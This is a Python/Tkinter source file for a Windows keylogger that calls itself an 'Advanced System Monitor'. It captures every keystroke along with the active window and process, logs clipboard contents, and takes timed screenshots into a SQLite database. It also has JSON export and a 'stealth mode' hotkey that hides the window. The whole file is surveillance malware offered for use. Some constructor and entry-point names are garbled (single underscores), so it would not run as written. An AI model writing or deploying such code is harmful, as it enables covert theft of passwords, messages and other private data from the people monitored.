import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
import threading
import time
from datetime import datetime
import os
import queue
import hashlib
import sqlite3
from dataclasses import dataclass
from pathlib import Path
import ctypes
import json
import sys

# Third-party imports with better error handling
try:
    from pynput import keyboard as pynput_keyboard
    import psutil
    import win32gui
    import win32process
    from PIL import ImageGrab, Image
    import clipboard
except ImportError as e:
    print(f"Missing module: {e}")
    print("Installing required modules...")
    import subprocess
    subprocess.check_call([sys.executable, "-m", "pip", "install", 
                          "pynput", "psutil", "pywin32", "pillow", "clipboard"])
    print("Installation complete. Please restart the application.")
    sys.exit(1)

@dataclass
class Config:
    log_file: str = "sysmon.log"
    db_file: str = "sysmon.db"
    screenshot_interval: int = 300  # seconds
    clipboard_monitoring: bool = True
    auto_scroll: bool = True
    max_log_entries: int = 1000

class KeyloggerDB:
    def _init_(self, db_path):
        self.db_path = db_path
        self.init_db()
    
    def init_db(self):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS keystrokes
                     (id INTEGER PRIMARY KEY AUTOINCREMENT, 
                      timestamp TEXT, 
                      key TEXT, 
                      process TEXT, 
                      window TEXT)''')
        c.execute('''CREATE TABLE IF NOT EXISTS clipboard
                     (id INTEGER PRIMARY KEY AUTOINCREMENT, 
                      timestamp TEXT, 
                      content TEXT)''')
        c.execute('''CREATE TABLE IF NOT EXISTS screenshots
                     (id INTEGER PRIMARY KEY AUTOINCREMENT,
                      timestamp TEXT,
                      filepath TEXT)''')
        conn.commit()
        conn.close()
    
    def log_keystroke(self, key, process, window):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        timestamp = datetime.now().isoformat()
        c.execute("INSERT INTO keystrokes (timestamp, key, process, window) VALUES (?, ?, ?, ?)",
                 (timestamp, str(key), process, window))
        conn.commit()
        conn.close()
        return c.lastrowid
    
    def log_clipboard(self, content):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        timestamp = datetime.now().isoformat()
        c.execute("INSERT INTO clipboard (timestamp, content) VALUES (?, ?)",
                 (timestamp, content[:1000]))
        conn.commit()
        conn.close()
    
    def log_screenshot(self, filepath):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        timestamp = datetime.now().isoformat()
        c.execute("INSERT INTO screenshots (timestamp, filepath) VALUES (?, ?)",
                 (timestamp, filepath))
        conn.commit()
        conn.close()
    
    def get_stats(self):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        
        c.execute("SELECT COUNT(*) FROM keystrokes")
        key_count = c.fetchone()[0]
        
        c.execute("SELECT COUNT(*) FROM clipboard")
        clipboard_count = c.fetchone()[0]
        
        c.execute("SELECT COUNT(*) FROM screenshots")
        screenshot_count = c.fetchone()[0]
        
        conn.close()
        return key_count, clipboard_count, screenshot_count

class ModernGUI:
    def _init_(self):
        self.root = tk.Tk()
        self.config = Config()
        self.db = KeyloggerDB(self.config.db_file)
        
        # Variables
        self.running = False
        self.key_queue = queue.Queue()
        self.keyboard_listener = None
        self.stats_update_id = None
        self.log_entries = []
        
        # Colors
        self.colors = {
            'bg': '#1e1e2e',
            'fg': '#cdd6f4',
            'accent': '#89b4fa',
            'success': '#a6e3a1',
            'warning': '#f9e2af',
            'error': '#f38ba8',
            'surface': '#313244',
            'surface2': '#45475a'
        }
        
        self.setup_gui()
        self.setup_menu()
        self.setup_hotkeys()
        
        # Start GUI update loop
        self.update_gui()
        
    def setup_gui(self):
        """Setup the main GUI window"""
        self.root.title("Advanced System Monitor")
        self.root.geometry("900x700")
        self.root.configure(bg=self.colors['bg'])
        
        # Set icon (if available)
        try:
            self.root.iconbitmap(default='icon.ico')
        except:
            pass
        
        # Create main container
        main_container = ttk.Frame(self.root)
        main_container.pack(fill='both', expand=True, padx=10, pady=10)
        
        # Style configuration
        self.setup_styles()
        
        # Create notebook for tabs
        self.notebook = ttk.Notebook(main_container)
        self.notebook.pack(fill='both', expand=True)
        
        # Create tabs
        self.create_monitor_tab()
        self.create_stats_tab()
        self.create_settings_tab()
        self.create_logs_tab()
        
        # Status bar
        self.create_status_bar()
        
    def setup_styles(self):
        """Configure ttk styles"""
        style = ttk.Style()
        style.theme_use('clam')
        
        # Configure colors
        style.configure('TNotebook', background=self.colors['bg'])
        style.configure('TNotebook.Tab', 
                       background=self.colors['surface'],
                       foreground=self.colors['fg'],
                       padding=[10, 5])
        style.map('TNotebook.Tab',
                 background=[('selected', self.colors['accent'])],
                 foreground=[('selected', self.colors['bg'])])
        
        style.configure('TFrame', background=self.colors['bg'])
        style.configure('TLabel', 
                       background=self.colors['bg'],
                       foreground=self.colors['fg'])
        
    def create_monitor_tab(self):
        """Create the main monitoring tab"""
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text='📊 Live Monitor')
        
        # Control panel
        control_frame = tk.Frame(tab, bg=self.colors['surface'], height=100)
        control_frame.pack(fill='x', pady=(0, 10))
        control_frame.pack_propagate(False)
        
        # Title
        tk.Label(control_frame, 
                text="System Activity Monitor",
                font=('Segoe UI', 16, 'bold'),
                bg=self.colors['surface'],
                fg=self.colors['accent']).pack(pady=10)
        
        # Control buttons
        button_frame = tk.Frame(control_frame, bg=self.colors['surface'])
        button_frame.pack()
        
        self.start_btn = self.create_button(
            button_frame, 
            "▶ Start Monitoring",
            self.start_monitoring,
            self.colors['success'],
            'left'
        )
        
        self.stop_btn = self.create_button(
            button_frame, 
            "⏹ Stop Monitoring",
            self.stop_monitoring,
            self.colors['error'],
            'left',
            state='disabled'
        )
        
        self.screenshot_btn = self.create_button(
            button_frame, 
            "📸 Screenshot",
            self.take_screenshot,
            self.colors['accent'],
            'left'
        )
        
        self.clear_btn = self.create_button(
            button_frame, 
            "🗑 Clear Log",
            self.clear_log,
            self.colors['warning'],
            'left'
        )
        
        # Live log viewer
        log_frame = tk.Frame(tab, bg=self.colors['surface2'])
        log_frame.pack(fill='both', expand=True, pady=10)
        
        tk.Label(log_frame, 
                text="Live Activity Feed",
                font=('Segoe UI', 12, 'bold'),
                bg=self.colors['surface2'],
                fg=self.colors['accent']).pack(pady=5)
        
        # Create text widget with scrollbar
        text_frame = tk.Frame(log_frame, bg=self.colors['surface2'])
        text_frame.pack(fill='both', expand=True, padx=10, pady=10)
        
        self.log_text = scrolledtext.ScrolledText(
            text_frame,
            height=20,
            bg=self.colors['bg'],
            fg=self.colors['fg'],
            font=('Consolas', 10),
            insertbackground=self.colors['accent'],
            relief='flat',
            borderwidth=0
        )
        self.log_text.pack(fill='both', expand=True)
        
        # Configure text tags
        self.log_text.tag_config('info', foreground=self.colors['fg'])
        self.log_text.tag_config('success', foreground=self.colors['success'])
        self.log_text.tag_config('warning', foreground=self.colors['warning'])
        self.log_text.tag_config('error', foreground=self.colors['error'])
        self.log_text.tag_config('key', foreground=self.colors['accent'], font=('Consolas', 10, 'bold'))
        
    def create_stats_tab(self):
        """Create statistics tab"""
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text='📈 Statistics')
        
        # Stats cards
        stats_frame = tk.Frame(tab, bg=self.colors['bg'])
        stats_frame.pack(fill='both', expand=True, padx=20, pady=20)
        
        # Create stat cards
        self.stat_cards = {}
        stats = [
            ('Keys Logged', 'keys', self.colors['accent']),
            ('Clipboard Entries', 'clipboard', self.colors['success']),
            ('Screenshots', 'screenshots', self.colors['warning']),
            ('Database Size', 'dbsize', self.colors['error'])
        ]
        
        for i, (title, key, color) in enumerate(stats):
            card = tk.Frame(stats_frame, bg=self.colors['surface'], relief='ridge', bd=2)
            card.grid(row=i//2, column=i%2, padx=10, pady=10, sticky='nsew')
            
            tk.Label(card, 
                    text=title,
                    font=('Segoe UI', 12),
                    bg=self.colors['surface'],
                    fg=color).pack(pady=(15,5))
            
            self.stat_cards[key] = tk.Label(card,
                                           text="0",
                                           font=('Segoe UI', 24, 'bold'),
                                           bg=self.colors['surface'],
                                           fg=self.colors['fg'])
            self.stat_cards[key].pack(pady=(0,15))
        
        # Configure grid
        stats_frame.grid_columnconfigure(0, weight=1)
        stats_frame.grid_columnconfigure(1, weight=1)
        stats_frame.grid_rowconfigure(0, weight=1)
        stats_frame.grid_rowconfigure(1, weight=1)
        
        # Export button - Create a frame to center it
        button_frame = tk.Frame(tab, bg=self.colors['bg'])
        button_frame.pack(fill='x', pady=10)
        
        export_btn = self.create_button(
            button_frame,
            "📥 Export Data",
            self.export_data,
            self.colors['accent'],
            None  # No side parameter - will use pack with no side
        )
        # Center the button manually
        export_btn.pack(expand=True)
        
    def create_settings_tab(self):
        """Create settings tab"""
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text='⚙ Settings')
        
        settings_frame = tk.Frame(tab, bg=self.colors['surface'])
        settings_frame.pack(fill='both', expand=True, padx=20, pady=20)
        
        # Monitoring settings
        tk.Label(settings_frame,
                text="Monitoring Settings",
                font=('Segoe UI', 14, 'bold'),
                bg=self.colors['surface'],
                fg=self.colors['accent']).pack(pady=10)
        
        # Screenshot interval
        interval_frame = tk.Frame(settings_frame, bg=self.colors['surface'])
        interval_frame.pack(fill='x', pady=5)
        
        tk.Label(interval_frame,
                text="Screenshot Interval (seconds):",
                bg=self.colors['surface'],
                fg=self.colors['fg']).pack(side='left', padx=10)
        
        self.interval_var = tk.StringVar(value=str(self.config.screenshot_interval))
        tk.Spinbox(interval_frame,
                  from_=30,
                  to=3600,
                  textvariable=self.interval_var,
                  width=10,
                  bg=self.colors['bg'],
                  fg=self.colors['fg'],
                  relief='flat').pack(side='left', padx=10)
        
        # Clipboard monitoring toggle
        self.clipboard_var = tk.BooleanVar(value=self.config.clipboard_monitoring)
        tk.Checkbutton(settings_frame,
                      text="Enable Clipboard Monitoring",
                      variable=self.clipboard_var,
                      bg=self.colors['surface'],
                      fg=self.colors['fg'],
                      selectcolor=self.colors['bg']).pack(pady=10)
        
        # Auto-scroll toggle
        self.autoscroll_var = tk.BooleanVar(value=self.config.auto_scroll)
        tk.Checkbutton(settings_frame,
                      text="Auto-scroll Log",
                      variable=self.autoscroll_var,
                      bg=self.colors['surface'],
                      fg=self.colors['fg'],
                      selectcolor=self.colors['bg']).pack(pady=10)
        
        # Save button
        button_frame = tk.Frame(settings_frame, bg=self.colors['surface'])
        button_frame.pack(pady=20)
        
        self.create_button(
            button_frame,
            "💾 Save Settings",
            self.save_settings,
            self.colors['success'],
            None
        ).pack()
        
    def create_logs_tab(self):
        """Create logs viewer tab"""
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text='📋 Logs')
        
        # Log viewer
        log_frame = tk.Frame(tab, bg=self.colors['surface2'])
        log_frame.pack(fill='both', expand=True, padx=10, pady=10)
        
        # Search bar
        search_frame = tk.Frame(log_frame, bg=self.colors['surface2'])
        search_frame.pack(fill='x', pady=5)
        
        tk.Label(search_frame,
                text="Search:",
                bg=self.colors['surface2'],
                fg=self.colors['fg']).pack(side='left', padx=5)
        
        self.search_var = tk.StringVar()
        self.search_var.trace('w', lambda *args: self.search_logs())
        
        tk.Entry(search_frame,
                textvariable=self.search_var,
                bg=self.colors['bg'],
                fg=self.colors['fg'],
                relief='flat',
                width=30).pack(side='left', padx=5)
        
        # Log type selector
        self.log_type_var = tk.StringVar(value="All")
        log_types = ["All", "Keystrokes", "Clipboard", "Screenshots"]
        
        type_menu = tk.OptionMenu(search_frame, self.log_type_var, *log_types)
        type_menu.config(bg=self.colors['surface'], fg=self.colors['fg'])
        type_menu.pack(side='right', padx=5)
        
        # Log text area
        self.logs_text = scrolledtext.ScrolledText(
            log_frame,
            height=25,
            bg=self.colors['bg'],
            fg=self.colors['fg'],
            font=('Consolas', 10),
            relief='flat',
            borderwidth=0
        )
        self.logs_text.pack(fill='both', expand=True, pady=10)
        
    def create_status_bar(self):
        """Create status bar at bottom"""
        status_bar = tk.Frame(self.root, bg=self.colors['surface'], height=25)
        status_bar.pack(fill='x', side='bottom')
        
        self.status_label = tk.Label(status_bar,
                                    text="Ready",
                                    bg=self.colors['surface'],
                                    fg=self.colors['fg'])
        self.status_label.pack(side='left', padx=10)
        
        self.time_label = tk.Label(status_bar,
                                  text=datetime.now().strftime("%H:%M:%S"),
                                  bg=self.colors['surface'],
                                  fg=self.colors['fg'])
        self.time_label.pack(side='right', padx=10)
        
    def create_button(self, parent, text, command, color, side='left', state='normal'):
        """Create a styled button"""
        btn = tk.Button(parent,
                       text=text,
                       command=command,
                       bg=color,
                       fg='black',
                       font=('Segoe UI', 10, 'bold'),
                       padx=15,
                       pady=8,
                       relief='flat',
                       cursor='hand2',
                       state=state)
        
        # Pack the button if side is provided and valid
        if side and side in ['top', 'bottom', 'left', 'right']:
            btn.pack(side=side, padx=5, pady=2)
        else:
            # Just pack normally if no side or invalid side
            btn.pack(padx=5, pady=2)
        
        # Hover effects
        def on_enter(e):
            if btn['state'] != 'disabled':
                btn['bg'] = self.lighten_color(color)
        
        def on_leave(e):
            if btn['state'] != 'disabled':
                btn['bg'] = color
        
        btn.bind("<Enter>", on_enter)
        btn.bind("<Leave>", on_leave)
        
        return btn
    
    def lighten_color(self, color):
        """Lighten a color for hover effects"""
        # Simple lightening for common colors
        lighten_map = {
            self.colors['success']: '#b4e0b0',
            self.colors['error']: '#f5a5b8',
            self.colors['accent']: '#9fc5ff',
            self.colors['warning']: '#fbeba5'
        }
        return lighten_map.get(color, color)
    
    def setup_menu(self):
        """Setup menu bar"""
        menubar = tk.Menu(self.root)
        self.root.config(menu=menubar)
        
        # File menu
        file_menu = tk.Menu(menubar, tearoff=0)
        menubar.add_cascade(label="File", menu=file_menu)
        file_menu.add_command(label="Export Data", command=self.export_data)
        file_menu.add_command(label="Clear Database", command=self.clear_database)
        file_menu.add_separator()
        file_menu.add_command(label="Exit", command=self.root.quit)
        
        # View menu
        view_menu = tk.Menu(menubar, tearoff=0)
        menubar.add_cascade(label="View", menu=view_menu)
        view_menu.add_command(label="Show/Hide", command=self.toggle_stealth)
        
        # Help menu
        help_menu = tk.Menu(menubar, tearoff=0)
        menubar.add_cascade(label="Help", menu=help_menu)
        help_menu.add_command(label="About", command=self.show_about)
        
    def setup_hotkeys(self):
        """Setup hotkeys"""
        self.root.bind('<Control-Alt-H>', lambda e: self.toggle_stealth())
        self.root.bind('<Control-Alt-S>', lambda e: self.take_screenshot())
        self.root.bind('<F1>', lambda e: self.show_help())
        
    def start_monitoring(self):
        """Start monitoring"""
        self.running = True
        self.start_btn.config(state='disabled')
        self.stop_btn.config(state='normal')
        
        # Start keyboard listener
        self.keyboard_listener = pynput_keyboard.Listener(on_press=self.on_key_press)
        self.keyboard_listener.start()
        
        # Start clipboard monitoring
        if self.clipboard_var.get():
            self.clipboard_thread = threading.Thread(target=self.monitor_clipboard, daemon=True)
            self.clipboard_thread.start()
        
        # Start screenshot timer
        self.screenshot_timer = threading.Timer(self.config.screenshot_interval, self.auto_screenshot)
        self.screenshot_timer.daemon = True
        self.screenshot_timer.start()
        
        self.log("✅ Monitoring started", 'success')
        self.update_status("Monitoring active")
        
    def stop_monitoring(self):
        """Stop monitoring"""
        self.running = False
        self.start_btn.config(state='normal')
        self.stop_btn.config(state='disabled')
        
        if self.keyboard_listener:
            self.keyboard_listener.stop()
        
        if hasattr(self, 'screenshot_timer'):
            self.screenshot_timer.cancel()
        
        self.log("⏹ Monitoring stopped", 'error')
        self.update_status("Monitoring stopped")
        
    def on_key_press(self, key):
        """Handle key press"""
        try:
            # Get active window
            process, window = self.get_active_window()
            
            # Format key
            if hasattr(key, 'char') and key.char:
                key_str = key.char
            else:
                key_str = str(key).replace('Key.', '<') + '>'
            
            # Add to queue
            self.key_queue.put({
                'key': key_str,
                'process': process,
                'window': window
            })
            
        except Exception as e:
            self.log(f"Error: {e}", 'error')
    
    def get_active_window(self):
        """Get active window and process"""
        try:
            hwnd = win32gui.GetForegroundWindow()
            _, pid = win32process.GetWindowThreadProcessId(hwnd)
            process = psutil.Process(pid)
            window = win32gui.GetWindowText(hwnd)
            return process.name(), window
        except:
            return "unknown", "unknown"
    
    def monitor_clipboard(self):
        """Monitor clipboard changes"""
        last_content = ""
        while self.running:
            try:
                content = clipboard.paste()
                if content and content != last_content and len(content) < 500:
                    self.db.log_clipboard(content)
                    self.log(f"📋 Clipboard: {content[:50]}...", 'info')
                    last_content = content
                time.sleep(2)
            except:
                time.sleep(2)
    
    def take_screenshot(self):
        """Take a screenshot"""
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"screenshot_{timestamp}.png"
            
            screenshot = ImageGrab.grab()
            screenshot.save(filename)
            
            self.db.log_screenshot(filename)
            self.log(f"📸 Screenshot saved: {filename}", 'success')
            
        except Exception as e:
            self.log(f"❌ Screenshot failed: {e}", 'error')
    
    def auto_screenshot(self):
        """Take automatic screenshot"""
        if self.running:
            self.take_screenshot()
            
            # Schedule next screenshot
            self.screenshot_timer = threading.Timer(self.config.screenshot_interval, self.auto_screenshot)
            self.screenshot_timer.daemon = True
            self.screenshot_timer.start()
    
    def log(self, message, tag='info'):
        """Add message to log"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        log_entry = f"[{timestamp}] {message}\n"
        
        self.log_text.insert(tk.END, log_entry, tag)
        
        if self.autoscroll_var.get():
            self.log_text.see(tk.END)
        
        # Process key queue
        self.process_key_queue()
        
    def process_key_queue(self):
        """Process keys from queue"""
        try:
            while True:
                key_data = self.key_queue.get_nowait()
                
                # Log to database
                self.db.log_keystroke(
                    key_data['key'],
                    key_data['process'],
                    key_data['window']
                )
                
                # Update live log
                self.log_text.insert(
                    tk.END,
                    f"[{datetime.now().strftime('%H:%M:%S')}] "
                    f"🔑 {key_data['key']} | {key_data['process']} | {key_data['window'][:30]}\n",
                    'key'
                )
                
                if self.autoscroll_var.get():
                    self.log_text.see(tk.END)
                    
        except queue.Empty:
            pass
    
    def clear_log(self):
        """Clear the log display"""
        self.log_text.delete(1.0, tk.END)
        self.log("Log cleared", 'warning')
    
    def search_logs(self):
        """Search through logs"""
        search_term = self.search_var.get().lower()
        log_type = self.log_type_var.get()
        
        # Clear current display
        self.logs_text.delete(1.0, tk.END)
        
        conn = sqlite3.connect(self.config.db_file)
        c = conn.cursor()
        
        if log_type == "Keystrokes" or log_type == "All":
            c.execute("SELECT timestamp, key, process, window FROM keystrokes ORDER BY timestamp DESC LIMIT 500")
            for row in c.fetchall():
                entry = f"[{row[0]}] KEY: {row[1]} | {row[2]} | {row[3]}\n"
                if not search_term or search_term in entry.lower():
                    self.logs_text.insert(tk.END, entry, 'key')
        
        if log_type == "Clipboard" or log_type == "All":
            c.execute("SELECT timestamp, content FROM clipboard ORDER BY timestamp DESC LIMIT 100")
            for row in c.fetchall():
                entry = f"[{row[0]}] CLIPBOARD: {row[1][:100]}\n"
                if not search_term or search_term in entry.lower():
                    self.logs_text.insert(tk.END, entry, 'info')
        
        conn.close()
    
    def update_stats(self):
        """Update statistics display"""
        key_count, clipboard_count, screenshot_count = self.db.get_stats()
        
        self.stat_cards['keys'].config(text=str(key_count))
        self.stat_cards['clipboard'].config(text=str(clipboard_count))
        self.stat_cards['screenshots'].config(text=str(screenshot_count))
        
        # Calculate database size
        if os.path.exists(self.config.db_file):
            size = os.path.getsize(self.config.db_file)
            if size < 1024:
                size_str = f"{size} B"
            elif size < 1024*1024:
                size_str = f"{size/1024:.1f} KB"
            else:
                size_str = f"{size/(1024*1024):.1f} MB"
            self.stat_cards['dbsize'].config(text=size_str)
        
        # Schedule next update
        self.stats_update_id = self.root.after(2000, self.update_stats)
    
    def update_gui(self):
        """Periodic GUI updates"""
        # Update time
        self.time_label.config(text=datetime.now().strftime("%H:%M:%S"))
        
        # Process any pending keys
        self.process_key_queue()
        
        # Schedule next update
        self.root.after(100, self.update_gui)
    
    def update_status(self, message):
        """Update status bar"""
        self.status_label.config(text=message)
    
    def toggle_stealth(self):
        """Toggle window visibility"""
        if self.root.state() == 'normal':
            self.root.withdraw()
            self.update_status("Stealth mode active")
        else:
            self.root.deiconify()
            self.update_status("Visible")
    
    def save_settings(self):
        """Save settings"""
        try:
            self.config.screenshot_interval = int(self.interval_var.get())
            self.config.clipboard_monitoring = self.clipboard_var.get()
            self.config.auto_scroll = self.autoscroll_var.get()
            
            self.log("✅ Settings saved", 'success')
            messagebox.showinfo("Success", "Settings saved successfully!")
            
        except ValueError:
            messagebox.showerror("Error", "Invalid interval value")
    
    def export_data(self):
        """Export data to JSON"""
        filename = filedialog.asksaveasfilename(
            defaultextension=".json",
            filetypes=[("JSON files", ".json"), ("All files", ".*")]
        )
        
        if filename:
            try:
                conn = sqlite3.connect(self.config.db_file)
                c = conn.cursor()
                
                data = {
                    'keystrokes': [],
                    'clipboard': [],
                    'screenshots': [],
                    'export_date': datetime.now().isoformat()
                }
                
                c.execute("SELECT * FROM keystrokes")
                for row in c.fetchall():
                    data['keystrokes'].append({
                        'id': row[0],
                        'timestamp': row[1],
                        'key': row[2],
                        'process': row[3],
                        'window': row[4]
                    })
                
                c.execute("SELECT * FROM clipboard")
                for row in c.fetchall():
                    data['clipboard'].append({
                        'id': row[0],
                        'timestamp': row[1],
                        'content': row[2]
                    })
                
                c.execute("SELECT * FROM screenshots")
                for row in c.fetchall():
                    data['screenshots'].append({
                        'id': row[0],
                        'timestamp': row[1],
                        'filepath': row[2]
                    })
                
                conn.close()
                
                with open(filename, 'w') as f:
                    json.dump(data, f, indent=2)
                
                self.log(f"📥 Data exported to {filename}", 'success')
                messagebox.showinfo("Success", "Data exported successfully!")
                
            except Exception as e:
                messagebox.showerror("Error", f"Export failed: {e}")
    
    def clear_database(self):
        """Clear all database entries"""
        if messagebox.askyesno("Confirm", "Are you sure you want to clear all data?"):
            conn = sqlite3.connect(self.config.db_file)
            c = conn.cursor()
            
            c.execute("DELETE FROM keystrokes")
            c.execute("DELETE FROM clipboard")
            c.execute("DELETE FROM screenshots")
            
            conn.commit()
            conn.close()
            
            self.log("🗑 Database cleared", 'warning')
            self.search_logs()
    
    def show_about(self):
        """Show about dialog"""
        about_text = """Advanced System Monitor v2.0
        
A comprehensive system monitoring tool with:
* Keystroke logging
* Clipboard monitoring
* Screenshot capture
* Real-time activity display
* Statistics tracking
* Data export

Created with Python and Tkinter
© 2024"""
        
        messagebox.showinfo("About", about_text)
    
    def show_help(self):
        """Show help dialog"""
        help_text = """Keyboard Shortcuts:
* Ctrl+Alt+H - Hide/Show window
* Ctrl+Alt+S - Take screenshot
* F1 - Show this help

Features:
* Monitor keystrokes in real-time
* Track clipboard changes
* Automatic screenshots
* Search through logs
* Export data to JSON

For more information, visit the documentation."""
        
        messagebox.showinfo("Help", help_text)
    
    def run(self):
        """Run the application"""
        # Start stats update
        self.update_stats()
        
        # Center window on screen
        self.root.update_idletasks()
        width = self.root.winfo_width()
        height = self.root.winfo_height()
        x = (self.root.winfo_screenwidth() // 2) - (width // 2)
        y = (self.root.winfo_screenheight() // 2) - (height // 2)
        self.root.geometry(f'{width}x{height}+{x}+{y}')
        
        # Start main loop
        self.root.mainloop()

def check_admin():
    """Check if running as administrator"""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def main():
    """Main entry point"""
    # Check for admin privileges
    if not check_admin():
        print("⚠ Warning: Not running as administrator")
        print("Some features may not work properly.\n")
    
    # Create and run the application
    app = ModernGUI()
    app.run()

if _name_ == "_main_":
    main()